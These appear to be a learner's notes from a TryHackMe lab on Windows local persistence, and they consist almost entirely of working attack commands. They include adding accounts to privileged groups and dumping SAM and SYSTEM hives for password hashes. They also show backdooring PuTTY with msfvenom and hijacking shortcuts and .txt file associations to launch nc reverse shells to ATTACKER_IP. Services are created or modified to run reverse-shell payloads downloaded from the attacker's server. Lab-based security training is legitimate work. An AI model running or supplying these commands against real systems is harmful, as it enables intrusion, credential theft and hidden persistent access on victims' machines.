-reasons for local persistence
1. re-exploitation isn't always possible
2. getting a foothold is hard to reproduce
3. security is one step behind

---------------------------------------------------------------------------------------------

Assign Group Membership
-make unprivileged user gain admin privileges
net localgroup administrators thmuser0 /add

-avoid being suspicious - use backup operators group
-won't have admin privileges but have read/write access to anyfile or registry key on the system
-can escalate to admin account trivially
net localgroup "Backup Operators" thmuser1 /add

-add to RDP or winRM
net localgroup "Remote Mangement Users" thmuser1 /add

-connect using evil-winrm
evil-winrm -i [IP] -u thmuser1 -p Password321
whoami /groups

-LocalAccountTokenFilterPolicy implemented by User Account Control (UAC) - strips admin privileges when logging in remotely
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

*stay in directory: C:\Users\thmuser1\Documents

(on evil-winrm)
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak

-attacker machine
(apt install python3-impacket)
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
-get hashes
-log into administator using hashes
evil-winrm -i [IP] -u Administrator
THM{FLAG_BACKED_UP!}

Special Privileges and Security Descriptors
-SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
-SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
-admin terminal
secedit /export /cfg config.inf
-go to file same directory
-add thmuser2 to SeBackupPrivilege and SeRestorePrivilege
-save file
-convert .inf file to .sdb file to load configuration back into the system
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
-add thmuser2 to remote mangement users group
-powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
-add thmuser2 and give full control permissions
-log in using evil-winrm
evil-winrm -i [IP] -u thmuser2 -p Password321
cd C:\flags
.\flag2.exe
*THM{IM_JUST_A_NORMAL_USER}

RID Hijacking


----------------------------------------------------------------------------------------------------------------------------------------------------

Backdooring files

Executabel files
-tampering with files user interacts with regularly
-files must keep working as expected
-eg executable file on the desktop
-use msfvenom to generate an executable
-eg. shortcut to PuTTY points to C:\Program Files\PuTTY\putty.exe
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe

Shortcut files
-make shortcut point to a scritps that will run the backdoor and then execute the usual program
-create powershell script
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe [Attacker IP] [Port]"
C:\Windows\System32\calc.exe
-save file as backdoor.ps1 in windows\system32
-right click on calc and got to shortcut
-in the target add
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
-start an nc listener on attacker machine
nc -lvp port
-run calc
-get flag5
*THM{NO_SHORTCUTS_IN_LIFE}

Hijacking File Associations
-hijack any file association to force the os to run a shell wheever user opens a specific file
-associations kept in HKLM\Software\Classes
-find a reference to program halding the ProgID
-exampel is txtfile -> NOTEPAD.EXE
-%1 represents the name of the opened file
-create a backdoor
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
-change the registry key to backdoor
powershell -windowstyle hidden C:\windows\backdoor2.ps1 %1
-start listener
nc -lvp 4448
-run file
-get flag
*THM{TXT_FILES_WOULD_NEVER_HURT_YOU}

--------------------------------------------------------------------------------------------------------------------------------

Abusing Services
-using service is great for establishing persistence
-configured to run in the background
-can regain control of victim machine each time it is started
-create a background service
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
-create a reverse shell with msfvenom and associate it with the created service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attack IP] LPORT=[attack port] -f exe-service -o rev-svc.exe
-attack machine
python3 -m http.server
-victim machine
wget http://[attackIP]:8000/rev-svc.exe-O rev-svc.exe
-set bin path and service
sc.exe create THMservice2 binPath= "C:\..\rev-svc.exe" start= auto
-start listner
nc -lvp [attack port]
-start service
sc.exe start THMservice2
-grab flag
*THM{SUSPICIOUS_SERVICE}

Modifying existing services
-disabled service = good candidate 
-query 
sc.exe query state=all
-THMService3 example
sc.exe qc THMService3
-three steps
1. binary-path-name should point to payload
2. start-type shouhld be automatic without user interaction
3. service-start-name should be preferebly set to LocalSystem
-create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc.exe
-host 
python3 -m http.server
-get file on victiim machine - powershell
PS C:\Users\Administrator> wget http://attackerIP:8000/rev-svc.exe -O rev-svc.exe
-set parameters
sc.exe config THMservice3 binPath= "C:\Users\Administrator\rev-svc.exe" start= auto obj= "LocalSystem"
-start listener on port 5558 on attack machine
nc -lvp 5558
-start service
sc.exe start THMservice3
-grab flag
*THM{IN_PLAIN_SIGHT}



